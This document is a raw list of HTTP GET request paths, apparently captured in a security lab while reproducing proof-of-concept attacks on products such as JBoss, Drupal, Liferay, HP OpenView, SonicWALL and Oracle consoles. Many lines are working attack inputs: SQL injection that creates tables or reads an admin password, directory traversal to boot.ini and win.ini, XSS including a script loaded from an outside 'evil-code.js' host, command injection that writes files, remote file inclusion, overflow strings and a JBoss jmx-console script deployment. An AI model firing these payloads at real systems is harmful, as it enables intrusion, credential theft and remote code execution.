GET /icons/back.gif
GET /icons/text.gif
GET /WADashboard/dashboard/Dashboard.aspx
GET /nullpoc.jsp
GET /favicon.ico
GET /favicon.ico
GET /poc.ts
GET /poc.pdf
GET /favicon.ico
GET /favicon.ico
GET /jetspeed/portal/
GET /jetspeed/login/redirector?token=vrtuser-1458245159941
GET /jetspeed/login/redirector?token=vrtuser-1458245159941
GET /jetspeed/portal/Administrative/site.psml
GET /jetspeed/portal/_ns:Z2pzLXNpdGUyX19wc20tMTB8aS9wb3J0YWxTaXRlTWFuYWdlci8-d2lja2V0OmludGVyZmFjZT06MDp0YWJzOnRhYnMtY29udGFpbmVyOnRhYnM6NTpsaW5rOjpJQmVoYXZpb3JMaXN0ZW5lcjowOnxm/Administrative/site.psml
GET /jetspeed/portal/_ns:YVAtMTUzZDNkY2Y4MTEtMTAwMDFfX1AtMTUzZDNkY2Y4MTEtMTAwMDJ8YzI_/default-page.psml
GET /jetspeed/decorations/portlet/jetspeed/images/view.gif
GET /poc.fpx
GET /backend/ExtJs.php?file=view/../../../../../../../../../tmp/poc
GET /HostStorageServlet?DeviceId=1&state=FileSystem%20ID&orderBy=FileSystemId;create%20table%20poc(code%20int);--&orderDir=ASC
GET /poc.html
GET /poc.pdf
GET /favicon.ico
GET /poc.pdf
GET /web/guest/home?p_p_id=58&p_p_lifecycle=0&p_p_state=maximized&p_p_mode=view&saveLastPath=false&_58_struts_action=%2Flogin%2flogin&_58_login=pwn3r%40vrt.net
GET /html/js/liferay/available_languages.jsp?browserId=firefox&themeId=classic&colorSchemeId=01&minifierType=js&languageId=en_US&b=6205&t=1452627014000
GET /struts2-rest-showcase/orders.xhtml
GET /poc.pdf
GET /poc.pdf
GET /poc.html
GET /poc.html
GET /NbuErrorMessageServlet?exitCode=1;create%20table%20poc(code%20int);--
GET /poc-test/UrlValidator.action
GET /ScriptServlet?state=schedulerule&BpaScheduleName=telus&ScriptSchedule=aaa',0,'telus','1',5);create%20table%20poc(code%20int);--
GET /poc.php
GET /poc.ump
GET /favicon.ico
GET /poc.ump
GET /poc.ump
GET /kchoubey/poc.ump
GET /kchoubey/poc.pdf
GET /totally_legit.txt
GET /poc.rar
GET /poc.xlsx
GET /poc.html
GET /drupal/taxonomy_term/filler/system/touch%20poc.txt/
GET /drupal/admin/reports/updates/update
GET /drupal/admin/reports/updates/check?destination=/drupal/admin/reports/updates/update&token=U8FxkEhjnXgHl4uUr8Y5W-k-KHI0VGbpizbk0EuWTxc
GET /drupal/batch?id=23&op=start
GET /poc.ump
GET /favicon.ico
GET /sites/all/modules/coder/coder_upgrade/scripts/coder_upgrade.run.php?file=http://10.1.0.29
GET /poc.html
GET /poc.php
GET /poc.exe
GET /servlet/APMBVHandler?OPERATION_TYPE=&userName=asdf&OPM_BVNAME=aaa'%3bcreate%20%20table%20poc(code%20int)%3b--&DEVICES_LIST=1,2&DISPLAYNAME=aaa'%3bcreate%20%20table%20poc(code%20int)%3b--
GET /servlet/APMBVHandler?OPERATION_TYPE=&OPM_BVNAME=aaa'%3bcreate%20%20table%20poc(code%20int)%3b--
GET /getcaminfo.asp?VWID=1%20+UNION+SELECT+name+FROM+msysobjects+IN+%27\\Windows\\System32\\calc.txt%27%00
GET /getcaminfo.asp?VWID=1%20+UNION+SELECT+name+FROM+msysobjects+IN+%27\\Windows\\System32\\calc.exe%27%00
GET /vts/WAP/../Vendors.ini%00a.jpg
GET /poc.pdf
GET /poc.html
GET /poc10.js
GET /poc.emf
GET /poc.emf
GET /poc.emf
GET /NewApplication/Accounts.Dynamic%00.wbmp
GET /../../../../windows/test.jpg
GET /mantisbt/view_all_bug_page.php?view_type=%22%3E%3cscript%3ealert(%27TELUS%20Security%20Labs%27)%3C/script%3E
GET /mantisbt/css/common_config.php
GET /poc.ump
GET /poc.ump
GET /admin/config.php?display=blah
GET /pcheng/poc.pict
GET /themagicwords
GET /pcheng/poc.pdf
GET /Downloads/poc.pdf
GET /drupal8/user/login
GET /drupal8/system/temporary?file=config.tar.gz
GET /jsp/Login.jsp
GET /poc.dtd
GET /pcheng/poc.ttf
GET /poc.emf
GET /pcheng/poc.html
GET /pcheng/poc.pdf
GET /poc.html
GET /pcheng/poc.pdf
GET /admin/config.php
GET /admin/config.php?display=modules&action=upload&download=filler&remotemod=http%3a%2f%2f127.0.0.1%2ffiller+%3B+echo+%27TELUS+Security+Labs%27+%3E+%2Ftmp%2fpoc.txt
GET /poc.html
GET /sugarcrm/custom/poc.php
GET /sugarcrm/custom/poc.php
GET /admin/config.php
GET /pcheng/poc.jpg
GET /favicon.ico
GET /pcheng/poc.otf
GET /favicon.ico
GET /dashboard/jsp/download_lar.jsp?lar=../../../../../../../../../Windows/win.ini
GET /poc.html
GET /poc.mp4
GET /sgms/ImagePreviewServlet?logoID=1%20AND%201=2%20union%20select%20PASSWORD%20from%20sgmsdb.userpasswords%20where%20ID='admin'
GET /ivr/telus_telus/poc.aspx
GET /ivr/(S(4aue1moupecvjfvshhvgqt2m))/telus_telus/poc.aspx
GET /favicon.ico
GET /%7eblin/poc.smil
GET /securecgi-bin/CSUserCGI.exe?Logout+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.b.c.d.e
GET /printers/?QUERY=........................................................................................................................................................................................................%20AND%20....................................................................................................
GET /test.html
GET /test.html
GET /test.html
GET /aaaaa.nsf?\x80
GET /favicon.ico
GET /favicon.ico
GET /poc.html
GET /poc.search-ms
GET /poc.html
GET /poc.search-ms
GET /Robo/Reports/data/Help_Errors.asp?date=d1&display=0&max=8&print=0&action=hide&r0=12;create%20table%20thack(i%20int)&x=69&y=6
GET /Robo/Reports/data/Help_Errors.asp?date=d1&display=0&max=8&print=0&action=hide&r0=12;create%20table%20thack(i%20int)&x=69&y=6
GET /Robo/Reports/data/Help_Errors.asp?date=d1&display=0&max=8&print=0&action=hide&r0=12;create%20table%20thack(i%20int)&x=69&y=6
GET /%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/boot.ini
GET /poc.html
GET /favicon.ico
GET /poc.html
GET /poc.html
GET /poc.html
GET /clients/dsgw/bin/search?context=dsgw
GET /favicon.ico
GET /poc.rtf
GET /weblogic
GET /login.php?ora_osb_bgcookie=%26+cmd.exe+/c+echo+Assurent+Secure+Technologies+%3E+c:\\PoC.txt+%26echo&button=Logout
GET /favicon.ico
GET /TicTacToe.class
GET /sso/jsp/login.jsp?site2pstoretoken=XSS%22%3e%3cscript%20src=%22http://sticky.vrt.telus.com/
GET /OvCGI/ovlaunch.exe
GET /qfsearch/AdminServlet?&req=top&adminurl=
GET /qfsearch/AdminServlet?&req=qftoc&adminurl=
GET /qfsearch/AdminServlet?&req=collections&adminurl=
GET /qfsearch/AdminServlet?&req=global&adminurl=%22%3E%3cscript%20src=http://www.www.example2.com/scripts/evil-code.js%3E%3C/script%3E
GET /qfsearch/AdminServlet?&req=gbltop&adminurl=
GET /qfsearch/AdminServlet?&req=gbltoc&adminurl=
GET /qfsearch/AdminServlet?&req=sites&adminurl=
GET /BPELConsole/default/activities.jsp?'><script>alert(document.cookie)</script>=
GET /favicon.ico
GET /favicon.ico
GET /OvCgi/Toolbar.exe
GET /OvCgi/Toolbar.exe
GET /favicon.ico
GET /ibm/console/%3Cscript%3ealert('DSecRG_XSS')%3C/script%3E.jsp
GET /testrequest.html
GET /testrequest.html
GET /testrequest.html
GET /%c0%af/webdav/protected-TELUSSecurityLabs.txt
GET /pwn
GET /OvCgi/webappmon.exe?ins=nowait&act=rping&app=rping&arg=aa&sel=BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
GET /consolehelp/console-help.portal
GET /consolehelp/utils/JStree/images/plusbottom.gif
GET /consolehelp/utils/JStree/images/minusbottom.gif
GET /consolehelp/utils/JStree/images/folder.gif
GET /consolehelp/framework/skins/console/images/bkgnd_footer.gif
GET /consolehelp/framework/skins/console/images/tab_right.gif
GET /consolehelp/framework/skins/console/images/tab_right.gif
GET /consolehelp/console-help.portal;ADMINCONSOLESESSION=JX0ZKnrQSHFRY5Jw1bLJyZlyGjT0VZ0Z1T1MGkkGjwMbvsTThcRR!986091621?_nfpb=true&_pageLabel=ConsoleHelpSearchPage
GET /consolehelp/framework/skeletons/console/js/util.js
GET /consolehelp/framework/skins/console/css/menu.css
GET /consolehelp/framework/skins/console/css/console.css
GET /consolehelp/en-us/wls-console-help.css
GET /consolehelp/en-us/displayContent.js
GET /consolehelp/images/spacer.gif
GET /consolehelp/framework/skins/console/images/window_l.gif
GET /consolehelp/navtree/searchlist.js
GET /consolehelp/framework/skins/console/images/tab_right.gif
GET /consolehelp/framework/skins/console/images/bkgnd_footer.gif
GET /consolehelp/console-help.portal;ADMINCONSOLESESSION=JX0ZKnrQSHFRY5Jw1bLJyZlyGjT0VZ0Z1T1MGkkGjwMbvsTThcRR!986091621?_nfpb=true&_pageLabel=ConsoleHelpSearchPage&searchQuery=%22%3E%3Cscript%3Ealert%28%27Telus+XSS%27%29%3C%2Fscript%3E%22
GET /consolehelp/framework/skins/console/images/window_r.gif
GET /consolehelp/navtree/searchlist.js
GET /consolehelp/framework/skins/console/images/tab_left.gif
GET /consolehelp/framework/skins/console/images/bkgnd_footer.gif
GET /search/query/search?search.timezone=&search_p_groups=%22%3E%3Cscript%3Ealert(%27TELUS%20Security%20Labs%27)%3C/script%3E%22
GET /search/query/css/yui_2_2_2/reset-fonts-grids.css
GET /search/query/js/yui_2_2_2/utilities.js
GET /search/query/js/yui_2_2_2/treeview-min.js
GET /search/query/js/Locale10_1_8_2.js
GET /search/query/js/TabbedNavigationList10_1_8_2.js
GET /search/query/js/BrowseModel10_1_8_2.js
GET /search/query/js/SuggestedContentModel10_1_8_2.js
GET /search/query/js/SearchResultsModel10_1_8_2.js
GET /search/query/js/ClusterView10_1_8_2.js
GET /search/query/css/yui_2_2_2/tree.css
GET /search/query/images/Oracle_3d_v3.jpg
GET /favicon.ico
GET /favicon.ico
GET /testapp%3f/login.aspx
GET /testapp%3f/login.aspx
GET /testapp%3f/login.aspx
GET /testapp%3f/login.aspx
GET /testapp%3f/login.aspx
GET /testapp%3f/login.aspx
GET /testapp%3f/login.aspx
GET /testapp%3f/login.aspx
GET /testapp%3f/login.aspx
GET /testapp%3f/login.aspx
GET /testapp%3f/login.aspx
GET /testapp%3f/login.aspx
GET /testapp%3f/login.aspx
GET /login.php?url=/index.php?
GET /login.php?clear=yes
GET /js/rb.js
GET /css/style_ns.css
GET /favicon.ico
GET /js/functions.js
GET /images/l2_btn_red.gif
GET /images/swoosh.gif
GET /images/rswoosh.gif
GET /images/l1_nub_a_gy.gif
GET /images/l1_nub_b_yy.gif
GET /images/l1_nub_b_ry.gif
GET /images/l1_nub_b_yr.gif
GET /images/l1_nub_b_rr.gif
GET /images/l1_nub_c_yg.gif
GET /images/l1_nub_c_rg.gif
GET /images/t.gif
GET /images/refresh.gif
GET /login.php?url=/index.php&button=Logout
GET /poc.html
GET /poc.asp
GET /tsl.jpg
GET /tsl.jpg
GET /tsl.jpg
GET /tsl.jpg
GET /tsl.jpg
GET /tsl.jpg
GET //PAYLOAD/EK.EXE
GET /robohelp/robo/reserved/web/9423265/test.jsp
GET /manager/images/asf-logo.gif
GET /manager/images/tomcat.gif
GET /poc.svg
GET /poc.svg
GET /Backups/FVEAPI.DLL
GET /Content-Type%3A%20multipart%2frelated%3b%20boundary%3d_bang%0d%0a%0d%0a--_bang%0d%0aContent-Location%3atelus%0d%0aContent-Transfer-Encoding%3abase64%0d%0a%0d%0aPHNjcmlwdD5hbGVydCgiVEVMVVMgU2VjdXJpdHkgTGFicyBQcm9vZiBvZiBDb25jZXB0Iik7PC9zY3JpcHQ%2b%0d%0a--_bang--%0d%0a
GET /favicon.ico
GET /PerformanceManagement/jsp/qa.jsp?func=browse&root=wi&path=../../../../../../boot.ini
GET /PlatformServices/service/app/logon.object;jsessionid=2D5693AF8B0D3BE3091FB2B516D82BF5?appKind=InfoView&service=%2FInfoViewApp%2fcommon%2fappService.do&loc=null
GET /PerformanceManagement/jsp/qa.jsp?func=browse&root=wi&path=../../../../../../boot.ini
GET /PerformanceManagement/jsp/qa.jsp?func=browse&root=wi&path=../../../../../../boot.ini
GET /webdav/IEShims.dll
GET /OvCgi/jovgraph.exe?app=In+Out+Octets&act=Graph+Traffic&arg=-title+%22Graph:In+Out+traffic%22-displayWidth+1AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA+-mib+%22IfInOctets::1::::::,IfOutOctets::1::::::%22+%09++++$%7bOVwSelections%7d&sel=172.16.8.1
GET /favicon.ico
GET /poc.html
GET /binaries/inst.exe
GET /favicon.ico
GET /jmx-console/HtmlAdaptor?action=invokeOpByName&name=jboss.deployer%3Aservice%3DBSHDeployer&methodName=createScriptDeployment&argType=java.lang.String&arg0=import%20java.io.%2A%3B%0AFile%20f%3B%0Atry%20%7B%0A%20%20%20%20theos%3DSystem.getProperty%28%22os.name%22%29%3B%0A%20%20%20%20if%28theos.startsWith%28%22Windows%22%29%29%7B%0A%20%20%20%20%20%20%20%20f%3Dnew%20File%28%22c%3A%2Ftelus.txt%22%29%3B%0A%20%20%20%20%7D%20else%20%7B%0A%20%20%20%20%20%20%20%20f%3Dnew%20File%28%22%2Ftmp%2Ftelus.txt%22%29%3B%0A%20%20%20%20%7D%0A%20%20%20%20if%28%21f.exists%28%29%29%7B%0A%20%20%20%20%20%20%20%20f.createNewFile%28%29%3B%0A%20%20%20%20%20%20%20%20System.out.println%28%22New%20file%20poc.txt%20has%20been%20created%22%29%3B%0A%20%20%20%20%7D%0A%20%20%20%20else%20%7B%0A%20%20%20%20%20%20%20%20System.out.println%28%22File%20poc.txt%20exists%22%29%3B%0A%20%20%20%20%7D%0A%7D%20catch%20%28%20IOException%20e%29%20%7B%0A%20%20%20%20System.out.println%28%22Encountered%20error%3A%20%22%20%2B%20e%29%3B%0A%7D%0A&argType=java.lang.String&arg1=soap
GET /Attack/poc.mpg
GET /Attack/poc.mpg
GET /Attack/ehTrace.dll
GET /ccmcip/xmldirectorylist.jsp?f=vsr'
GET /favicon.ico
GET /cwhp/device.center.do?device=72a9f
GET /cwhp/device.center.do?device=72a9f
GET /CSCOnm/servlet/com.cisco.core.mice.main?command=coreBaseRegistration&coreid=00EBEE0386A3627EB21C481A57C47616&url=%2Fcwhp%2Fdevice.center.do%3Fdevice%3D72a9f%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E5f5251aaad%3D1&hostname=dhcp102
GET /cwhp/device.center.do?device=72a9f
GET /cwhp/uii/cwhp_global.css
GET /cwhp/uii/dojo_olduii.css
GET /cwhp/js/dojocw-1.0.0/dijit/themes/tundra/tundra.css
GET /cwhp/js/dojocw-1.0.0/dojox/grid/resources/tundraGrid.css
GET /cwhp/js/dojocw-1.0.0/cues/themes/kubrick/layout.css
GET /cwhp/js/dojocw-1.0.0/cues/themes/kubrick/button.css
GET /cwhp/js/dojocw-1.0.0/xwt/themes/kubricklite/application.css
GET /cwhp/js/dojocw-1.0.0/dojocw/themes/kubricklite/dojocw_application.css
GET /cwhp/js/dojocw-1.0.0/xwt/themes/kubricklite/navigation.css
GET /cwhp/js/dojocw-1.0.0/xwt/themes/kubricklite/search.css
GET /cwhp/js/dojocw-1.0.0/dojocw/themes/kubricklite/dojocw_search.css
GET /cwhp/js/dojocw-1.0.0/xwt/themes/kubricklite/megamenu.css
GET /cwhp/js/dojocw-1.0.0/xwt/themes/kubricklite/breadcrumb.css
GET /cwhp/js/dojocw-1.0.0/xwt/themes/kubricklite/servertime.css
GET /cwhp/js/dojocw-1.0.0/dojocw/themes/kubricklite/ServerTime.css
